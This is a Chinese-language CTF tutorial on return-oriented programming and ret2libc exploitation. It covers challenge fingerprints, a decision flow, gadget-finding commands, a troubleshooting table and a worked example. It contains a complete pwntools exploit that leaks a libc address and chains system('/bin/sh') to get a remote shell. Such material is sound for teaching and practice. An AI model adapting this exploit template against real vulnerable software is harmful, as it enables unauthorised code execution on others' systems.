# ROP 与 ret2libc

关键词：ROP ret2libc 返回导向编程 gadget libc 泄露 puts 地址泄露 one_gadget ret2csu 栈迁移 libc database 二进制利用 pwn

## ① 识别指纹

- ELF 二进制，`checksec` 显示 **NX enabled**（栈不可执行）
- 程序里**没有现成的后门函数**（`objdump` 翻一遍找不到 `system` / `execve`）
- 程序会先输出点什么，再要求输入 —— 那个输出很可能就是**地址泄露**
- 题目附件里**附带一个 `libc.so.6`** —— 出题人明示"这题要 ret2libc"
- 题干出现 `ROP` / `ret2libc` / `gadget` / `libc` / `ORW`
- 分值中等偏上，通常在 pwn 方向第 2–4 题的档位

## ② 考什么

- 栈不可执行时，用程序自己的**代码片段（gadget）**串成调用链
- 64 位传参：`pop rdi; ret`、`pop rsi; pop r15; ret`、`pop rdx; ...`
- `ret2libc` 三段式：**泄露 libc 地址 → 算 libc base → 再打一次 system("/bin/sh")**
- libc 版本识别：`libc-database`、`one_gadget`、已知函数偏移
- `ret2csu`（找不到 `pop rdx` 时用 `__libc_csu_init` 的万能 gadget）
- 栈迁移（`leave; ret`、`leave; ret` + `bss` 段）
- 32 位用栈传参，64 位用寄存器传参（**这是最容易写错的地方**）
- 栈对齐约束（`movaps`）

## ③ 判断流程

### ③-1 子类型分流

1. **有现成后门函数**（如 `system("/bin/sh")` 已被调用、或存在 `get_shell`）→ 这不是 ROP 题，回 [栈溢出基础](/pwn/stack-basic)
2. **`checksec` 显示 NX enabled** 且无后门 → 继续下一条
3. **程序有没有"输出一个地址"的行为**（`puts`/`printf`/`write` 打印了某个函数地址或栈地址）？
   - 有 → **ret2libc 标准流程**，走 ③-2 的 A 组
   - 没有 → 走 ③-2 的 B 组（无泄露）
4. **附件给了 libc** → 走 A 组，且 libc 偏移直接可用
5. **附件没给 libc** → 走 A 组，但泄露后要用 libc-database 猜版本

### ③-2 成本排序链

**A. 有地址泄露（最常见）**

1. 用 `ROPgadget` / `ropper` 找 `pop rdi; ret` —— 有它才能给 `puts` 传参
2. 构造第一次 payload：`填充 + pop rdi; ret + got['puts'] + plt['puts'] + 主函数地址`
   - 作用：调用 `puts(puts@got)`，打印出 `puts` 的真实地址，然后**回到 main 再打一次**
3. 收泄露：`u64(recv(6).ljust(8, b'\x00'))`
4. 算 base：`libc_base = leaked - libc.symbols['puts']`
5. 算两个地址：`system = base + libc.symbols['system']`，`binsh = base + next(libc.search(b'/bin/sh'))`
6. 第二次 payload：`填充 + pop rdi; ret + binsh + ret(对齐) + system`
   - **64 位必须插一个 `ret` 做 16 字节对齐**，否则 `system` 内部 `movaps` 崩
7. 发 payload → `interactive()` → `cat flag`
8. 如果 `puts` 的 GOT 被延迟绑定（PLT 首次调用才解析）→ 改用 `write` 或先调用一次 `puts@plt`

**B. 无地址泄露**

1. 先确认**真的没有**：`objdump -d | grep -E 'call.*puts|call.*printf|call.*write'`，很多"看起来没有"的题其实在校验失败时会打印
2. 有 **PIE** 但高 12 位固定 → 试 **partial overwrite**（只覆盖低 1–2 字节）
3. 静态链接 + 有 `syscall` gadget → **直接 ret2syscall**，不需要 libc
4. 需要完整泄露但程序什么都不打印 → **BROP**（盲 ROP，工程量大，只在比赛里罕见出现）
5. 以上都不成立 → 回 [地址泄露与 PIE 绕过](/pwn/leak-pie)

## ④ 工具与命令

```bash
pip install pwntools ropper one_gadget
ROPgadget --binary ./pwn --only "pop|ret" | grep "pop rdi"
ropper --file ./pwn --search "pop rdi"
checksec --file=./pwn
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

```bash
# libc 版本识别
# 本地装了 libc-database
./find puts <低12位> <puts后3位>
# 或在线 https://libc.rip / https://libc.blukat.me
```

```python
from pwn import *

elf  = ELF('./pwn')
libc = ELF('./libc.so.6')
p    = remote('1.2.3.4', 9999)

pop_rdi = 0x4011d3                    # ROPgadget 找出来的
ret     = 0x40101a                    # 只含 ret 的 gadget，用于对齐

# 第一段：泄露 puts 真实地址
payload  = b'A' * 0x28
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendlineafter(b'input:', payload)

leak = u64(p.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
log.success(f'libc base = {hex(libc_base)}')

# 第二段：ret2libc
system = libc_base + libc.symbols['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))

payload  = b'A' * 0x28
payload += p64(ret)                   # 16 字节对齐
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)
p.sendlineafter(b'input:', payload)
p.interactive()
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `system` 执行后立刻崩 | 栈没 16 字节对齐 | payload 里 `pop_rdi` 前插一个 `ret` |
| 泄露出来的地址明显不对 | `recv` 少收/多收了字节 | `recvuntil(b'\n')` 去掉换行再 `ljust(8, b'\x00')` |
| 算出来的 libc base 不是页对齐 | libc 版本不对 | base 必须 `& 0xfff == 0`，不对就换 libc |
| 本地通远程不通 | libc 版本差异 | 远程优先；用泄露值去 libc-database 反查 |
| `pop rdx` 找不到 | 二进制里确实没有 | 用 `ret2csu`，或换 `pop rdx; pop r12; ret` 这类组合 |
| 第二次 payload 没反应 | 返回地址写的是 `main` 但程序 `exit` 了 | 检查是否真的回到 main，或改成 `_start` |
| `puts` 泄露的是 PLT 地址不是 libc | 写成了 `elf.plt['puts']` 作为参数 | 参数必须是 `elf.got['puts']`（GOT 里存的是真实地址） |
| 32 位题按 64 位写 | 传参方式不同 | 32 位是栈传参：`p32(func) + p32(ret) + p32(arg)` |

## ⑥ 例题

**题目**：`ret2libc` 标准三段式
**来源**：CTF Wiki《ret2libc》章节的标准靶场结构；同类题在 BUUCTF 的 `ciscn` / `bjdctf` 系列大量出现

**题干**：给一个 ELF 和一份 `libc.so.6`。程序先 `puts("Welcome")`，然后 `read` 读入 0x100 字节到 0x28 大小的缓冲区。

**关键观察**：
- `checksec`：NX enabled、PIE disabled、Canary disabled
- `objdump` 里没有 `system` 调用，也没有 `get_shell`
- 程序里有 `puts@plt` 和 `puts@got` —— **有现成的"打印任意地址"的工具**
- 附件给了 libc —— 出题人明确指向 ret2libc

**走了哪条链**：③-1 第 2 条（NX 开启无后门）→ ③-1 第 3 条（存在输出行为）→ ③-2 A 组第 1–7 条。

**命令与输出**：

```text
$ ROPgadget --binary ./pwn --only "pop|ret" | grep "pop rdi"
0x0000000000401263 : pop rdi ; ret

$ checksec --file=./pwn
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

第一段跑完的输出：

```text
[+] libc base = 0x7f9c2c400000
```

`0x7f9c2c400000` 的低 12 位是 0 —— **页对齐成立，说明 libc 版本猜对了**。这是最实用的自检。

第二段之后：

```text
$ cat flag
flag{...}
```

**结果**：拿到 shell，读 flag。

**为什么必须回 main 第二次**：第一次 payload 只是"借程序的嘴"把 `puts` 的真实地址打印出来。打印完程序会继续往下走，如果直接 `exit`，你就没有第二次发送 payload 的机会了。所以第一次链的最后一个地址必须是 `main`（或 `_start`），让程序重新进入输入循环。

::: tip 自检三连
1. 泄露值低 12 位 = `libc.symbols['puts'] & 0xfff` → libc 版本对了
2. `libc_base & 0xfff == 0` → base 算对了
3. 本地能打通 → 再打远程
:::
